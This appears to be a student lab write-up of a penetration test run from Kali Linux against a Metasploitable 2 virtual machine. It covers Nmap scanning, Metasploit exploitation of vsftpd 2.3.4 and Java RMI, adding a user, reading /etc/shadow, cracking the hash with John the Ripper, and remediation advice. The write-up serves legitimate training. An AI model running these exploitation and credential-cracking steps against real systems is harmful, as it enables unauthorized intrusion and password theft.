# Simulating Real-World Network Exploitation and Defense

### 📁 Project by: Hemant Kumar Nirmalkar

This project demonstrates real-world ethical hacking practices using Kali Linux and Metasploitable virtual machines. We simulate penetration testing, enumeration, exploitation, and password cracking and suggest remediations to secure a vulnerable system.

---

## 🧠 Objectives

* To perform real-world network exploitation on a vulnerable system.
* To analyze network and service vulnerabilities using open-source tools.
* To simulate ethical hacking tasks, including scanning, exploitation, and remediation.
* To learn how attackers break into systems and how defenders can secure them.

---

## 🛠️ Requirements

* **Kali Linux** (Attacker machine)
* **Metasploitable 2** (Target/victim machine)
* VirtualBox or VMware to run both in a private network (Host-only Adapter)
* Basic networking knowledge

---

## 🕵️ Step-by-Step Tasks

---

### 🔍 Task 1: Basic Network Scan

**🎯 Goal:** Find active hosts in the local network.

#### ✅ Step-by-step:

1. Open the Kali\*\* Linux terminal\*\*.

2. Find your IP address with:

   ```bash
   ifconfig
   ```

   Example output:

   ```
   inet 192.168.56.102  netmask 255.255.255.0  broadcast 192.168.56.255
   ```

3. Derive the subnet using the IP and netmask:

   * IP: `192.168.56.102`

   * Netmask: `255.255.255.0` → CIDR Notation: `/24`

   * Subnet to scan: `192.168.56.0/24`

   > This means all IPs from `192.168.56.1` to `192.168.56.254` are part of the same network.

4. Run the Nmap scan on the subnet:

   ```bash
   nmap -v 192.168.56.0/24
   ```

   This will identify all active hosts in the local network and show their open ports.

#### 🖼 Screenshot:

---

### 🧭 Task 2: Reconnaissance

#### ✅ 2.1 Hidden Port Scan

Scan **all 65535 ports** on the target:

```bash
nmap -v -p- 192.168.56.101
```

🖼 Screenshot:&#x20;

#### ✅ 2.2 Service Version Detection

```bash
nmap -v -sV 192.168.56.101
```

🖼 Screenshot:&#x20;

#### ✅ 2.3 Operating System Detection

```bash
nmap -v -O 192.168.56.101
```

🖼 Screenshot:&#x20;

---

### 📋 Task 3: Enumeration

#### Target Information

* **Target IP Address:** `192.168.56.101`
* **MAC Address:** `00:0C:29:5D:FE:0B`
* **Device Type:** General Purpose
* **Running OS:** Linux Kernel 2.6.9 - 2.6.33

#### ⚙️ Open Ports and Services (Detected)

| Port   | State | Service | Version              |
| ------ | ----- | ------- | -------------------- |
| 21/tcp | open  | ftp     | vsftpd 2.3.4         |
| 22/tcp | open  | ssh     | OpenSSH 4.7p1 Debian |

#### 🔐 Hidden Ports and Services

| Port      | State | Service  | Version      |
| --------- | ----- | -------- | ------------ |
| 8787/tcp  | open  | drb      | Ruby DRb RMI |
| 47436/tcp | open  | mountd   | RPC          |
| 50918/tcp | open  | java-rmi | grmiregistry |
| 59995/tcp | open  | nlockmgr | RPC          |
| 60004/tcp | open  | status   | RPC          |

---

### 💣 Task 4: Exploitation of Services

We exploited the following services:

#### 1. vsftpd 2.3.4

* Used Metasploit module:

```bash
msfconsole
use exploit/unix/ftp/vsftpd_234_backdoor
set RHOST 192.168.56.101
run
```

#### 2. Java RMI

* Used: `exploit/multi/misc/java_rmi_server`
* Exploited remote method invocation vulnerability

#### 3. Shell access (post exploit)

* Used payloads to gain shell access via exploited ports.

🖼 Screenshot: Add screenshots of Metasploit terminal or sessions.

---

### 👤 Task 5: Create User with Root Permission

#### ✅ Commands:

```bash
adduser cyberhero
passwd cyberhero  # (Password: 987654321)
```

Check user info:

```bash
cat /etc/passwd | grep cyberhero
cat /etc/shadow | grep cyberhero
```

Example output:

```
cyberhero:x:1001:1001::/home/cyberhero:/bin/bash
cyberhero:$1$8nWuasXV$pk6ZABfqT9NoHv1pPX8Rj.
```

🖼 Screenshot:&#x20;

---

### 🔓 Task 6: Cracking Password Hash

#### ✅ Steps:

1. Store hash in a file:

```bash
echo '$1$8nWuasXV$pk6ZABfqT9NoHv1pPX8Rj.' > hash.txt
```

2. Crack using John the Ripper:

```bash
john hash.txt
john hash.txt --show
```

#### ✅ Cracked password:

```
987654321
```

🖼 Screenshot:&#x20;

---

### 🔧 Task 7: Remediation Suggestions

| Vulnerable Service | Current Version | Latest Version | Suggested Fix                       |
| ------------------ | --------------- | -------------- | ----------------------------------- |
| vsftpd             | 2.3.4           | 3.0.3          | Upgrade and disable anonymous login |
| OpenSSH            | 4.7p1           | 9.x            | Upgrade to latest OpenSSH           |
| Ruby DRb           | 1.8             | Not secure     | Disable or firewall DRb             |
| RPC ports          | N/A             | N/A            | Restrict access via firewall        |

---

## 📘 Major Learnings

* Understood how to scan, enumerate, and find vulnerabilities in systems.
* Gained hands-on experience with Nmap, Metasploit, John the Ripper.
* Learned how attackers find and crack passwords using hashes.
* Understood how to think like an attacker and act like a defender.

---

> 🚨 Disclaimer: All actions were performed in a **controlled virtual lab** for ethical and educational purposes only. Never use these techniques on real systems without permission.
